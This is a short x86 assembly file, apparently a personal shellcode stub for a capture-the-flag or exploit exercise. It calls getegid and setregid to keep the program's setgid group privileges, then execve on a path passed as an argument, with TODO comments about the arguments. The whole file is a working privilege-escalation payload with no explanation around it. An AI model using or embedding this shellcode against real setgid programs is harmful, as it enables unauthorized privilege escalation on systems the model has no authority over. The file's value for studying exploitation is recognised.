default rel

bits 32

global _start
section .text

_start:
    push 0x32             ; getegid
    pop eax
    int 0x80

    mov ebx, eax
    mov ecx, eax
    push 0x47           ; setregid
    pop eax             ; syscall # for setregid
    int 0x80
    
    ; execve(argv[1], NULL, NULL) TODO might need give non-NULL args
    push 0x0b           ; execve TODO might need to give non-null args
    pop eax
    mov ebx, [esp+4]    ; execve arg0 (pointer to argv[1] aka strpayload)
    ; mov ecx, [esp+8]    ; execve arg1 (pointer to argv[2], null string)
    ; mov edx, ecx        ; execve arg2 (pointer to argv[2], null string)
    xor ecx, ecx
    xor edx, edx
    int 0x80
